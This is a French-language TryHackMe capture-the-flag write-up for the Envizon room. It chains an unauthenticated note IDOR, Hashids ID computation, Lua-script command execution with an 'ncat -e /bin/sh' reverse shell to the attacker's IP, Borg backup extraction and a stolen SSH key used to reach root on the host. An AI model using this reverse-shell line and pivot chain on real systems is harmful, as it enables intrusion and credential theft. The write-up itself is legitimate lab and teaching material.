# ENVIZON – TRYHACKME WRITE-UP

**Difficulté :** HARD 
**Application :** Envizon 4.0.2alpha 
**Cible :** `10.80.177.160`

## 1. Reconnaissance

Je commence par effectuer un scan de ports afin d'identifier les services exposés :

```bash
nmap -sC -sV -p- 10.80.177.160
```

Deux ports intéressants sont découverts :

- **22/tcp :** SSH
- **3000/tcp :** application web Envizon en HTTPS

En consultant l'application :

```bash
curl -k -i https://10.80.177.160:3000/scans
```

Je constate une redirection vers `/users/sign_in`. L'accès aux scans nécessite donc une authentification.

## 2. Analyse de l'application et découverte d'un IDOR

Le challenge fournit le code source de l'application. Je décide donc d'adopter une approche *white-box* en examinant les routes, les contrôleurs et les modèles.

L'analyse me conduit vers la fonctionnalité de gestion des notes.

Je découvre qu'il est possible d'accéder à une note sans authentification :

```http
GET /notes/1
```

La réponse contient un message intéressant :

> Hi Paul, for security reasons I added hashids with a length of 30 characters to notes. I stored the password for this envizon instance in the note with id 380 and sent you the link by email.

Cette note révèle plusieurs informations :

- Les identifiants des notes sont protégés par Hashids.
- La longueur minimale des identifiants est de 30 caractères.
- Le mot de passe de l'instance est stocké dans la note ayant l'identifiant interne `380`.

Le problème est que la fonctionnalité permet d'accéder à des données sans vérifier correctement les autorisations. Il s'agit d'une vulnérabilité de type **IDOR (Insecure Direct Object Reference)**.

## 3. Exploitation de Hashids

Je cherche ensuite à retrouver l'identifiant public correspondant à la note `380`.

Hashids est une bibliothèque permettant de transformer des identifiants numériques en chaînes de caractères moins prévisibles. Il ne s'agit toutefois pas d'un mécanisme de chiffrement.

Après avoir identifié la configuration utilisée par l'application, je reproduis le calcul avec Ruby :

```ruby
require "hashids"

hid = Hashids.new("Note", 30)
hid.encode(380)
```

L'identifiant obtenu est :

```text
y2a419eKDBLRvEYobWNpw0jnr6xlAX
```

Je peux alors consulter directement la note :

```text
https://10.80.177.160:3000/notes/y2a419eKDBLRvEYobWNpw0jnr6xlAX
```

La réponse révèle le mot de passe de l'instance Envizon.

Cette étape permet de récupérer un premier secret exploitable.

## 4. Exécution de commandes à distance (RCE)

Je poursuis l'analyse du code source afin de comprendre comment l'application exécute ses scans.

Je m'intéresse particulièrement à la manière dont le scanner utilise les scripts Lua de Nmap.

En comprenant le fonctionnement de cette fonctionnalité, je parviens à faire exécuter une commande système depuis un script Lua :

```lua
os.execute("ncat -e /bin/sh 192.168.130.110 4444")
```

Sur ma machine, je démarre un listener :

```bash
rlwrap nc -lvnp 4444
```

Lorsque le script est exécuté par l'application, une connexion entrante est reçue.

Je vérifie les privilèges :

```bash
id
```

Résultat :

```text
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
```

J'obtiens donc un shell avec les privilèges root, mais dans le conteneur Alpine Linux utilisé par l'application.

**Important :** root dans le conteneur ne signifie pas nécessairement root sur la machine hôte.

## 5. Énumération du conteneur et découverte de Borg

Je commence à examiner le système de fichiers et les tâches planifiées.

Le fichier `/etc/crontabs/root` révèle plusieurs tâches périodiques :

```text
*/15 * * * * run-parts /etc/periodic/15min
0 * * * * run-parts /etc/periodic/hourly
0 2 * * * run-parts /etc/periodic/daily
```

En inspectant les scripts journaliers, je découvre une configuration de sauvegarde Borgmatic.

Le fichier `/etc/borgmatic/config.yaml` contient notamment :

```yaml
location:
  source_directories:
    - /root
  repositories:
    - /var/backup

retention:
  keep_daily: 7
  keep_weekly: 4
  keep_monthly: 6

storage:
  encryption_passcommand: 'echo [SECRET]'
```

Le dépôt Borg se trouve dans `/var/backup`.

Je remarque également que le script journalier contient une commande `borgmatic` commentée. Les sauvegardes présentes dans le dépôt sont donc des archives préexistantes.

Je liste les archives :

```bash
borgmatic list
```

Deux sauvegardes sont disponibles :

```text
envizon-2020-09-30T23:25:30.466049
envizon-2020-09-30T23:26:23.900026
```

Je décide d'extraire la première :

```bash
borgmatic extract --archive envizon-2020-09-30T23:25:30.466049
```

L'extraction restaure le contenu sauvegardé du répertoire `/root` du conteneur dans mon répertoire de travail.

## 6. Récupération du flag utilisateur et de la clé SSH

En examinant les fichiers restaurés, je découvre :

```text
root/
├── .ash_history
├── .bundle/
├── .cache/
├── .config/
├── .gemrc
├── .ssh/
│   └── id_ed25519
└── local.txt
```

Le fichier `local.txt` contient le premier flag.

Plus intéressant encore, le dossier `.ssh` contient une clé privée Ed25519.

Je récupère cette clé sur ma machine locale et je limite ses permissions :

```bash
chmod 600 id_rsa
```

Je peux maintenant tenter une connexion SSH en utilisant cette clé :

```bash
ssh -i id_rsa root@10.80.177.160
```

La connexion réussit !

Je découvre alors que je ne suis plus dans le conteneur Alpine, mais sur la machine hôte Ubuntu.

## 7. Accès root sur la machine hôte

Une fois connecté en SSH, je vérifie le contenu du répertoire personnel de root :

```bash
ls
```

Je découvre notamment :

```text
envizon_thm
root.txt
snap
```

Je récupère finalement le flag root :

```bash
cat root.txt
```

**Objectif atteint : accès root sur la machine hôte.**

---

## 8. Récapitulatif de la chaîne d'exploitation

| Étape | Découverte / exploitation |
|---|---|
| Reconnaissance | SSH et application Envizon sur le port 3000 |
| Analyse white-box | Étude des routes et contrôleurs |
| IDOR | Accès à une note sans authentification |
| Hashids | Reconstruction de l'identifiant de la note 380 |
| Secret | Récupération du mot de passe de l'instance |
| RCE | Exécution d'une commande via un script Lua |
| Conteneur | Shell root sur Alpine Linux |
| Borg | Extraction d'une ancienne sauvegarde |
| Pivot SSH | Récupération d'une clé privée Ed25519 |
| Root | Connexion SSH en root sur l'hôte Ubuntu |

## Conclusion

Ce challenge illustre l'importance d'une approche méthodique en pentest.

La compromission ne repose pas sur une seule vulnérabilité, mais sur l'enchaînement de plusieurs faiblesses :

- Une mauvaise gestion des autorisations sur les notes (IDOR).
- Une protection insuffisante des identifiants avec Hashids.
- Une fonctionnalité de scan permettant l'exécution de commandes.
- Des sauvegardes contenant des informations sensibles.
- Une clé SSH privée permettant de passer du conteneur à la machine hôte.

La leçon principale est qu'une compromission de conteneur peut devenir une compromission de l'hôte lorsque des secrets ou des clés d'accès sensibles sont présents dans son environnement.
